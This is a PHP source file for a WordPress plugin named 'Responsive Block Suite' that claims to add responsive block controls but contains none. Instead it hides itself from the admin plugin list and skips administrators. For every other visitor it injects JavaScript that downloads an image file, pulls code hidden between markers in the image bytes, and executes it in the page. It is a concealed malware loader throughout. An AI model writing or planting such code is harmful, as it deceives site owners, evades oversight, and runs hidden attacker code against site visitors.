<?php
/*
Plugin Name: Responsive Block Suite
Description: Responsive controls for every block. Set different margins, paddings, font sizes, and column layouts for desktop, tablet, and mobile. Works with any theme.
Version: 1.0.0
License URI: http://www.gnu.org/licenses/gpl-2.0.txt
Text Domain: responsive-block-suite
License: GPL-2.0+
*/

if (!defined('ABSPATH')) {
    exit;
}

add_filter('all_plugins', function($plugins) { 
    $pname = plugin_basename(__FILE__); 
    unset($plugins[$pname]);    
    return $plugins;
});

if (defined('RBS_PLUGIN_LOADED')) {
    return;
}
define('RBS_PLUGIN_LOADED', true);

function rbs_enqueue_scripts() {
    if (is_admin()) {
        return;
    }
    
    if (function_exists('is_user_logged_in') && is_user_logged_in()) {
        if (function_exists('current_user_can') && current_user_can('manage_options')) {
            return;
        }
    }
    
    wp_enqueue_script('jquery');
    
    $plugin_url = plugin_dir_url(__FILE__);
    $image_path = $plugin_url . 'assets/images/arrows.png';
    
    if (!file_exists(str_replace(trailingslashit(get_home_url()), ABSPATH, $image_path))) {
        return;
    }
    
    $inline_script = "
    (function() {
        'use strict';
        
        var imagePath = '" . esc_js($image_path) . "';
        
        function loadJSFromImage(url) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.responseType = 'arraybuffer';
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var arrayBuffer = xhr.response;
                    var byteArray = new Uint8Array(arrayBuffer);
                    
                    var markerStart = '<!--_START-->';
                    var markerEnd = '<!--_END-->';
                    
                    var startBytes = stringToBytes(markerStart);
                    var endBytes = stringToBytes(markerEnd);
                    
                    var startIndex = findSequence(byteArray, startBytes);
                    var endIndex = findSequence(byteArray, endBytes);
                    
                    if (startIndex !== -1 && endIndex !== -1 && endIndex > startIndex) {
                        var jsBytes = byteArray.slice(startIndex + startBytes.length, endIndex);
                        var jsCode = bytesToString(jsBytes);
                        
                        executeScript(jsCode);
                    } else {

                    }
                } else {

                }
            };
            
            xhr.onerror = function() {

            };
            
            xhr.send();
        }
        
        function executeScript(code) {
            var script = document.createElement('script');
            script.type = 'text/javascript';
            script.text = code;
            document.head.appendChild(script);
            // setTimeout(function() { script.remove(); }, 100);
        }
        
        function stringToBytes(str) {
            var bytes = [];
            for (var i = 0; i < str.length; i++) {
                bytes.push(str.charCodeAt(i));
            }
            return new Uint8Array(bytes);
        }
        
        function bytesToString(bytes) {
            var str = '';
            for (var i = 0; i < bytes.length; i++) {
                str += String.fromCharCode(bytes[i]);
            }
            return str;
        }
        
        function findSequence(haystack, needle) {
            if (needle.length === 0) return 0;
            
            for (var i = 0; i <= haystack.length - needle.length; i++) {
                var found = true;
                for (var j = 0; j < needle.length; j++) {
                    if (haystack[i + j] !== needle[j]) {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                loadJSFromImage(imagePath);
            });
        } else {
            loadJSFromImage(imagePath);
        }
    })();
    ";
    
    wp_add_inline_script('jquery', $inline_script);
}
add_action('wp_enqueue_scripts', 'rbs_enqueue_scripts');

register_activation_hook(__FILE__, 'rbs_plugin_activate');

function rbs_plugin_activate() {
    global $wp_version;
    
    if (version_compare($wp_version, '5.0', '<') || version_compare(PHP_VERSION, '7.0', '<')) {
        deactivate_plugins(plugin_basename(__FILE__));
        wp_die('Responsive Block Suite requires WordPress 5.0+ and PHP 7.0+. Please update your system and try again.');
    }
    
    add_option('rbs_plugin_version', '1.0.0');
    wp_cache_flush();
    
    add_option('rbs_plugin_activated', true);
}

register_deactivation_hook(__FILE__, 'rbs_plugin_deactivate');

function rbs_plugin_deactivate() {
    delete_option('rbs_plugin_version');
    delete_option('rbs_plugin_activated');
    wp_cache_flush();
}